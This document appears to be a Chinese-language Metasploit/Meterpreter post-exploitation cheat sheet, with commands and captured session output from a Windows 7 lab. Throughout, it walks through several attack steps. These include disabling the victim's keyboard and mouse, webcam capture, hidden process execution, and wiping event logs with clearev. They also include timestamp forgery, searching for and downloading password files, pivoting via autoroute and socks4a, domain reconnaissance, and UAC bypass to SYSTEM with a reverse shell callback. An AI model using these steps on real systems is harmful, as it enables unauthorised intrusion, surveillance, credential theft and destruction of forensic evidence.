# msfnote
msf命令笔记
```
系统命令
基本系统命令
sessions    #sessions –h 查看帮助
sessions -i <ID值>  #进入会话   -k  杀死会话
background  #将当前会话放置后台
run  #执行已有的模块，输入run后按两下tab，列出已有的脚本
info #查看已有模块信息
getuid # 查看权限 
getpid # 获取当前进程的pid
sysinfo # 查看目标机系统信息
ps # 查看当前活跃进程    kill <PID值> 杀死进程
idletime #查看目标机闲置时间
reboot / shutdown   #重启/关机
shell #进入目标机cmd shell
meterpreter > getuid
Server username: WIN-7\Win7
meterpreter > getpid
Current pid: 2852
meterpreter > sysinfo
Computer        : WIN-7
OS              : Windows 7 (Build 7600).
Architecture    : x64
System Language : zh_CN
Domain          : UKNOWSEC
Logged On Users : 3
Meterpreter     : x86/windows

meterpreter > ps
Process List
============
 PID   PPID  Name                     Arch  Session  User        Path
 ---   ----  ----                     ----  -------  ----        ----
    0     [System Process]                                    
    0     System                                              
  500   svchost.exe                                         
  4     smss.exe                                            
  348   csrss.exe                                           
  348   wininit.exe                                         
  388   csrss.exe                                           
  388   winlogon.exe                                        
  396   services.exe                                        
  396   lsass.exe                                           
  396   lsm.exe                                             
  500   svchost.exe                                         
  500   svchost.exe                                         
  500   vmacthlp.exe                                        
  500   svchost.exe                                         
  500   svchost.exe                                         
  500   TrustedInstaller.exe                                
  500   svchost.exe                                         
  500   svchost.exe                                         
 500   spoolsv.exe                                         
 500   svchost.exe                                         
 500   svchost.exe                                         
 500   sppsvc.exe                                          
 500   VGAuthService.exe                                   
 628   WmiPrvSE.exe                                        
 500   vmtoolsd.exe                                        
 500   ManagementAgentHost.exe                             
 500   wmpnetwk.exe                                        
 500   svchost.exe                                         
 500   msdtc.exe                                           
 404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe
 2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe
 500   svchost.exe                                         
 500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe
 860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe
 2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe
 3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe
 2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 500   SearchIndexer.exe                                   
 900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe
 500   svchost.exe                                         

meterpreter > idletime
User has been idle for: 14 mins 20 secs
uictl开关键盘/鼠标
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘
meterpreter > uictl disable mouse
Disabling mouse...
meterpreter > uictl disable keyboard
Disabling keyboard...
meterpreter > uictl enable mouse
Enabling mouse...
meterpreter > uictl enable keyboard
Enabling keyboard...
webcam摄像头命令
webcam_list  #查看摄像头
webcam_snap   #通过摄像头拍照
webcam_stream   #通过摄像头开启视频
execute执行文件
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互
meterpreter > execute -H -i -f cmd.exe
Process 3616 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7600]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Users\Win7\Desktop>
migrate进程迁移
getpid    # 获取当前进程的pid
ps   # 查看当前活跃进程
migrate <pid值>    #将Meterpreter会话移植到指定pid值进程中
kill <pid值>   #杀死进程
meterpreter > getpid
Current pid: 2852
meterpreter > ps

Process List
============

 PID   PPID  Name                     Arch  Session  User        Path
 ---   ----  ----                     ----  -------  ----        ----
    0     [System Process]                                    
    0     System                                              
  500   svchost.exe                                         
  4     smss.exe                                            
  348   csrss.exe                                           
  348   wininit.exe                                         
  388   csrss.exe                                           
  388   winlogon.exe                                        
  396   services.exe                                        
  396   lsass.exe                                           
  396   lsm.exe                                             
  500   svchost.exe                                         
  500   svchost.exe                                         
  500   vmacthlp.exe                                        
  500   svchost.exe                                         
  500   svchost.exe                                         
  500   TrustedInstaller.exe                                
  500   svchost.exe                                         
  500   svchost.exe                                         
 500   spoolsv.exe                                         
 500   svchost.exe                                         
 500   svchost.exe                                         
 500   sppsvc.exe                                          
 500   VGAuthService.exe                                   
 628   WmiPrvSE.exe                                        
 500   vmtoolsd.exe                                        
 500   ManagementAgentHost.exe                             
 500   wmpnetwk.exe                                        
 500   svchost.exe                                         
 500   msdtc.exe                                           
 404   conhost.exe              x64   1        WIN-7\Win7  C:\Windows\System32\conhost.exe
 2752  cmd.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\cmd.exe
 2752  calc.exe                 x64   1        WIN-7\Win7  C:\Windows\System32\calc.exe
 500   svchost.exe                                         
 500   taskhost.exe             x64   1        WIN-7\Win7  C:\Windows\System32\taskhost.exe
 860   dwm.exe                  x64   1        WIN-7\Win7  C:\Windows\System32\dwm.exe
 2728  explorer.exe             x64   1        WIN-7\Win7  C:\Windows\explorer.exe
 3380  shell.exe                x86   1        WIN-7\Win7  C:\Users\Win7\Desktop\shell.exe
 2752  vmtoolsd.exe             x64   1        WIN-7\Win7  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 500   SearchIndexer.exe                                   
 772   audiodg.exe              x64   0                    
 900   wuauclt.exe              x64   1        WIN-7\Win7  C:\Windows\System32\wuauclt.exe
 500   svchost.exe                                         

meterpreter > migrate 2876
[*] Migrating from 3504 to 2876...
[*] Migration completed successfully.
clearev清除日志
clearev  #清除windows中的应用程序日志、系统日志、安全日志
meterpreter > clearev
[*] Wiping 365 records from Application...
[*] Wiping 1222 records from System...
[*] Wiping 404 records from Security...


文件系统命令
基本文件系统命令
getwd 或者pwd # 查看当前工作目录  
ls
cd
search -f *pass*       # 搜索文件  -h查看帮助
cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容
upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上
download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上
edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件
rm C:\\lltest\\hack.txt
mkdir lltest2  #只能在当前目录下创建文件夹
rmdir lltest2  #只能删除当前目录下文件夹
getlwd   或者 lpwd   #操作攻击者主机 查看当前目录
lcd /tmp   #操作攻击者主机 切换目录
timestomp伪造时间戳
timestomp C:// -h   #查看帮助
timestomp -v C://2.txt   #查看时间戳
timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt
meterpreter > timestomp -v C://2.txt
[*] Showing MACE attributes for C://2.txt
Modified      : 2018-12-18 00:48:02 -0500
Accessed      : 2018-12-18 00:48:02 -0500
Created       : 2018-12-17 22:52:59 -0500
Entry Modified: 2018-12-18 00:48:10 -0500
meterpreter > timestomp -v C://1.txt
[*] Showing MACE attributes for C://1.txt
Modified      : 2018-12-17 22:52:44 -0500
Accessed      : 2018-12-17 22:52:59 -0500
Created       : 2018-12-17 22:52:59 -0500
Entry Modified: 2018-12-17 22:52:59 -0500
meterpreter > timestomp C://2.txt -f C://1.txt
[*] Pulling MACE attributes from C://1.txt
[*] Setting specific MACE attributes on C://2.txt
meterpreter > timestomp -v C://2.txt
[*] Showing MACE attributes for C://2.txt
Modified      : 2018-12-17 22:52:44 -0500
Accessed      : 2018-12-17 22:52:59 -0500
Created       : 2018-12-17 22:52:59 -0500
Entry Modified: 2018-12-17 22:52:59 -0500


网络命令
基本网络命令
ipconfig/ifconfig
netstat –ano
arp
getproxy   #查看代理信息
route   #查看路由
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:ba:a6:a7
MTU          : 1500
IPv4 Address : 192.168.130.128
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::c55f:725f:9e7d:7056
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:c0a8:16ab
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
IPv6 Address : fe80::5efe:c0a8:8280
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : Teredo Tunneling Pseudo-Interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::100:7f:fffe
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 14
============
Name         : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC : 00:0c:29:ba:a6:b1
MTU          : 1500
IPv4 Address : 192.168.22.171
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::b96b:f6e6:3371:444f
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > netstat -ano

Connection list
===============

    Proto  Local address                    Remote address       State        User  Inode  PID/Program name
    -----  -------------                    --------------       -----        ----  -----  ----------------
    tcp    0.0.0.0:135                      0.0.0.0:*            LISTEN       0     0      732/svchost.exe
    tcp    0.0.0.0:445                      0.0.0.0:*            LISTEN       0     0      4/System
    tcp    0.0.0.0:554                      0.0.0.0:*            LISTEN       0     0      1780/wmpnetwk.exe
    tcp    0.0.0.0:5357                     0.0.0.0:*            LISTEN       0     0      4/System
    tcp    0.0.0.0:49152                    0.0.0.0:*            LISTEN       0     0      396/wininit.exe
    tcp    0.0.0.0:49153                    0.0.0.0:*            LISTEN       0     0      772/svchost.exe
    tcp    0.0.0.0:49154                    0.0.0.0:*            LISTEN       0     0      900/svchost.exe
    tcp    0.0.0.0:49171                    0.0.0.0:*            LISTEN       0     0      508/lsass.exe
    tcp    0.0.0.0:49176                    0.0.0.0:*            LISTEN       0     0      500/services.exe
    tcp    0.0.0.0:49179                    0.0.0.0:*            LISTEN       0     0      1908/svchost.exe
    tcp    192.168.22.171:139               0.0.0.0:*            LISTEN       0     0      4/System
    tcp    192.168.22.171:58500             192.168.22.170:4444  ESTABLISHED  0     0      2876/vmtoolsd.exe
    tcp    192.168.22.171:58879             192.168.22.170:4444  ESTABLISHED  0     0      1684/shell.exe
    tcp    192.168.130.128:139              0.0.0.0:*            LISTEN       0     0      4/System
    tcp6   :::135                           :::*                 LISTEN       0     0      732/svchost.exe
    tcp6   :::445                           :::*                 LISTEN       0     0      4/System
    tcp6   :::554                           :::*                 LISTEN       0     0      1780/wmpnetwk.exe
    tcp6   :::3587                          :::*                 LISTEN       0     0      3824/svchost.exe
    tcp6   :::5357                          :::*                 LISTEN       0     0      4/System
    tcp6   :::49152                         :::*                 LISTEN       0     0      396/wininit.exe
    tcp6   :::49153                         :::*                 LISTEN       0     0      772/svchost.exe
    tcp6   :::49154                         :::*                 LISTEN       0     0      900/svchost.exe
    tcp6   :::49171                         :::*                 LISTEN       0     0      508/lsass.exe
    tcp6   :::49176                         :::*                 LISTEN       0     0      500/services.exe
    tcp6   :::49179                         :::*                 LISTEN       0     0      1908/svchost.exe
    udp    0.0.0.0:123                      0.0.0.0:*                         0     0      248/svchost.exe
    udp    0.0.0.0:500                      0.0.0.0:*                         0     0      900/svchost.exe
    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe
    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe
    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      248/svchost.exe
    udp    0.0.0.0:3702                     0.0.0.0:*                         0     0      1260/svchost.exe
    udp    0.0.0.0:4500                     0.0.0.0:*                         0     0      900/svchost.exe
    udp    0.0.0.0:5004                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe
    udp    0.0.0.0:5005                     0.0.0.0:*                         0     0      1780/wmpnetwk.exe
    udp    0.0.0.0:5355                     0.0.0.0:*                         0     0      648/svchost.exe
    udp    0.0.0.0:52358                    0.0.0.0:*                         0     0      1260/svchost.exe
    udp    0.0.0.0:58751                    0.0.0.0:*                         0     0      648/svchost.exe
    udp    0.0.0.0:62445                    0.0.0.0:*                         0     0      248/svchost.exe
    udp    0.0.0.0:65389                    0.0.0.0:*                         0     0      248/svchost.exe
    udp    127.0.0.1:1900                   0.0.0.0:*                         0     0      1260/svchost.exe
    udp    127.0.0.1:50203                  0.0.0.0:*                         0     0      508/lsass.exe
    udp    127.0.0.1:52360                  0.0.0.0:*                         0     0      648/svchost.exe
    udp    127.0.0.1:55889                  0.0.0.0:*                         0     0      1260/svchost.exe
    udp    127.0.0.1:64192                  0.0.0.0:*                         0     0      900/svchost.exe
    udp    192.168.22.171:137               0.0.0.0:*                         0     0      4/System
    udp    192.168.22.171:138               0.0.0.0:*                         0     0      4/System
    udp    192.168.22.171:1900              0.0.0.0:*                         0     0      1260/svchost.exe
    udp    192.168.22.171:55887             0.0.0.0:*                         0     0      1260/svchost.exe
    udp    192.168.130.128:137              0.0.0.0:*                         0     0      4/System
    udp    192.168.130.128:138              0.0.0.0:*                         0     0      4/System
    udp    192.168.130.128:1900             0.0.0.0:*                         0     0      1260/svchost.exe
    udp    192.168.130.128:55888            0.0.0.0:*                         0     0      1260/svchost.exe
    udp6   :::123                           :::*                              0     0      248/svchost.exe
    udp6   :::500                           :::*                              0     0      900/svchost.exe
    udp6   :::3540                          :::*                              0     0      3824/svchost.exe
    udp6   :::3702                          :::*                              0     0      248/svchost.exe
    udp6   :::3702                          :::*                              0     0      1260/svchost.exe
    udp6   :::3702                          :::*                              0     0      248/svchost.exe
    udp6   :::3702                          :::*                              0     0      1260/svchost.exe
    udp6   :::4500                          :::*                              0     0      900/svchost.exe
    udp6   :::5004                          :::*                              0     0      1780/wmpnetwk.exe
    udp6   :::5005                          :::*                              0     0      1780/wmpnetwk.exe
    udp6   :::5355                          :::*                              0     0      648/svchost.exe
    udp6   :::52359                         :::*                              0     0      1260/svchost.exe
    udp6   :::62446                         :::*                              0     0      248/svchost.exe
    udp6   :::65390                         :::*                              0     0      248/svchost.exe
    udp6   ::1:1900                         :::*                              0     0      1260/svchost.exe
    udp6   ::1:55886                        :::*                              0     0      1260/svchost.exe
    udp6   fe80::b96b:f6e6:3371:444f:1900   :::*                              0     0      1260/svchost.exe
    udp6   fe80::b96b:f6e6:3371:444f:55884  :::*                              0     0      1260/svchost.exe
    udp6   fe80::c55f:725f:9e7d:7056:546    :::*                              0     0      772/svchost.exe
    udp6   fe80::c55f:725f:9e7d:7056:1900   :::*                              0     0      1260/svchost.exe
    udp6   fe80::c55f:725f:9e7d:7056:55885  :::*                              0     0      1260/svchost.exe

meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    192.168.22.2     00:50:56:f2:7a:67  14
    192.168.22.170   00:0c:29:92:d5:46  14
    192.168.22.254   00:50:56:f5:66:dc  14
    192.168.22.255   ff:ff:ff:ff:ff:ff  14
    192.168.130.129  00:0c:29:74:6d:d0  11
    192.168.130.254  00:50:56:f7:97:52  11
    192.168.130.255  ff:ff:ff:ff:ff:ff  11
    224.0.0.22       00:00:00:00:00:00  1
    224.0.0.22       01:00:5e:00:00:16  11
    224.0.0.22       01:00:5e:00:00:16  14
    224.0.0.252      01:00:5e:00:00:fc  11
    224.0.0.252      01:00:5e:00:00:fc  14
    239.255.255.250  00:00:00:00:00:00  1
    239.255.255.250  01:00:5e:7f:ff:fa  11
    239.255.255.250  01:00:5e:7f:ff:fa  14
    255.255.255.255  ff:ff:ff:ff:ff:ff  11
    255.255.255.255  ff:ff:ff:ff:ff:ff  14

meterpreter > getproxy 
Auto-detect     : Yes
Auto config URL : 
Proxy URL       : 
Proxy Bypass    : 
meterpreter > route

IPv4 network routes
===================

    Subnet           Netmask          Gateway          Metric  Interface
    ------           -------          -------          ------  ---------
    0.0.0.0          0.0.0.0          192.168.22.2     10      14
    127.0.0.0        255.0.0.0        127.0.0.1        306     1
    127.0.0.1        255.255.255.255  127.0.0.1        306     1
    127.255.255.255  255.255.255.255  127.0.0.1        306     1
    192.168.22.0     255.255.255.0    192.168.22.171   266     14
    192.168.22.171   255.255.255.255  192.168.22.171   266     14
    192.168.22.255   255.255.255.255  192.168.22.171   266     14
    192.168.130.0    255.255.255.0    192.168.130.128  266     11
    192.168.130.128  255.255.255.255  192.168.130.128  266     11
    192.168.130.255  255.255.255.255  192.168.130.128  266     11
    224.0.0.0        240.0.0.0        127.0.0.1        306     1
    224.0.0.0        240.0.0.0        192.168.130.128  266     11
    224.0.0.0        240.0.0.0        192.168.22.171   266     14
    255.255.255.255  255.255.255.255  127.0.0.1        306     1
    255.255.255.255  255.255.255.255  192.168.130.128  266     11
    255.255.255.255  255.255.255.255  192.168.22.171   266     14

No IPv6 routes were found.
meterpreter >
portfwd端口转发
portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口
portfwd delete -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口删除
meterpreter > portfwd add -l 6666 -p 3389 -r 127.0.0.1
[*] Local TCP relay created: :6666 <-> 127.0.0.1:3389

meterpreter > portfwd delete -l 6666 -p 3389 -r 127.0.0.1
[*] Successfully stopped TCP relay on 0.0.0.0:6666
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local         Remote          Direction
   -----  -----         ------          ---------
     0.0.0.0:6666  127.0.0.1:3389  Forward
total active port forwards.

meterpreter > portfwd flush
[*] Successfully stopped TCP relay on 0.0.0.0:6666
[*] Successfully flushed 1 rules
meterpreter > portfwd list

No port forwards are currently active.
root@kali:~# rdesktop 127.0.0.1:6666
Failed to negotiate protocol, retrying with plain RDP.
WARNING: Remote desktop does not support colour depth 24; falling back to 16
autoroute添加路由
run autoroute –h #查看帮助
run autoroute -s 192.168.159.0/24  #添加到目标环境网络
run autoroute –p  #查看添加的路由
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Usage:   run autoroute [-r] -s subnet -n netmask
[*] Examples:
[*]   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
[*]   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
[*]   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
[*]   run autoroute -p                            # Print active routing table
[*]   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
[*] Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
[-] Deprecation warning: This script has been replaced by the post/multi/manage/autoroute module

meterpreter > run autoroute -s 192.168.130.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.130.0/255.255.255.0...
[+] Added route to 192.168.130.0/255.255.255.0 via 192.168.22.171
[*] Use the -p option to list all active routes

meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.130.0      255.255.255.0      Session 1

meterpreter >
然后可以利用arp_scanner、portscan等进行扫描

run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24
run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.130.0/24

[*] Running module against WIN-7
[*] ARP Scanning 192.168.130.0/24
[+]     IP: 192.168.130.1 MAC 00:50:56:c0:00:02 (VMware, Inc.)
[+]     IP: 192.168.130.128 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)
[+]     IP: 192.168.130.129 MAC 00:0c:29:74:6d:d0 (VMware, Inc.)
[+]     IP: 192.168.130.255 MAC 00:0c:29:ba:a6:a7 (VMware, Inc.)
[+]     IP: 192.168.130.254 MAC 00:50:56:f7:97:52 (VMware, Inc.)

Socks4a代理
msf> use auxiliary/server/socks4a 
msf > set srvhost 127.0.0.1
msf > set srvport 1080
msf > run
root@kali:~# gedit /etc/proxychains.conf 

socks4     127.0.0.1 1080
root@kali:~# proxychains nmap -sV 192.168.130.129
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-18 03:19 EST
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.130.129:49154-<><>-OK
Nmap scan report for bogon (192.168.130.129)
Host is up (0.0027s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
49154/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds

信息收集
信息收集的脚本较多，仅列几个常用的：

run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控
meterpreter > run post/windows/gather/checkvm

[*] Checking if WIN-7 is a Virtual Machine .....
[+] This is a VMware Virtual Machine
meterpreter > run post/windows/gather/forensics/enum_drives

Device Name:                    Type:   Size (bytes):
------------                    -----   -------------
<Physical Drives:>
\\.\PhysicalDrive0                   4702111234474983745
<Logical Drives:>
\\.\C:                               4702111234474983745
\\.\D:                               4702111234474983745
meterpreter > run post/windows/gather/enum_applications

[*] Enumerating applications installed on WIN-7

Installed Applications
======================

 Name                                                            Version
 ----                                                            -------
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161
 Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161


[+] Results stored in: /root/.msf4/loot/20181218215218_default_192.168.22.171_host.application_993878.txt
meterpreter > run post/windows/gather/dumplinks

[*] Running module against WIN-7
[*] Extracting lnk files for user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...
[*] No Recent Office files found for user Administrator. Nothing to do.
meterpreter > run post/windows/gather/enum_patches

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
meterpreter > run post/windows/gather/enum_domain

[+] FOUND Domain: uknowsec
[+] FOUND Domain Controller: WIN-0L310JHOGH6 (IP: 192.168.130.130)

提权
getsystem提权
getsystem
getsystem工作原理：

getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。
getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。
Windows服务已启动，导致与命名管道建立连接。
该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。
然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。
meterpreter > getuid
Server username: WIN-7\Win7
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
bypassuac
内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：

msf exploit(windows/local/bypassuac_eventvwr) > search bypassuac

Matching Modules
================

   Name                                              Disclosure Date  Rank       Check  Description
   ----                                              ---------------  ----       -----  -----------
   exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)
   exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
meterpreter > background 
[*] Backgrounding session 2...
msf exploit(multi/handler) > use exploit/windows/local/bypassuac
msf exploit(windows/local/bypassuac) > set session 2
session => 2
msf exploit(windows/local/bypassuac) > run

[*] Started reverse TCP handler on 192.168.22.170:4444 
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (179779 bytes) to 192.168.22.171
[*] Meterpreter session 3 opened (192.168.22.170:4444 -> 192.168.22.171:59068) at 2018-12-18 22:12:04 -0500

meterpreter > getuid
Server username: WIN-7\Win7
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

msf exploit(windows/local/bypassuac) > use exploit/windows/local/bypassuac_eventvwr 
msf exploit(windows/local/bypassuac_eventvwr) > show options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
  Windows x86


msf exploit(windows/local/bypassuac_eventvwr) > set session 2
session => 2
msf exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on 192.168.22.170:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (179779 bytes) to 192.168.22.171
[*] Meterpreter session 4 opened (192.168.22.170:4444 -> 192.168.22.171:59075) at 2018-12-18 22:25:01 -0500
[*] Cleaning up registry keys ...

meterpreter > getuid
Server username: WIN-7\Win7
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

内核漏洞提权
可先利用enum_patches模块收集补丁信息，然后查找可用的exploits进行提权

meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
meterpreter > run post/windows/gather/enum_patches

[+] KB2871997 is missing
[+] KB2928120 is missing
[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)
[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008
[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2
[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity
[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1
[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1
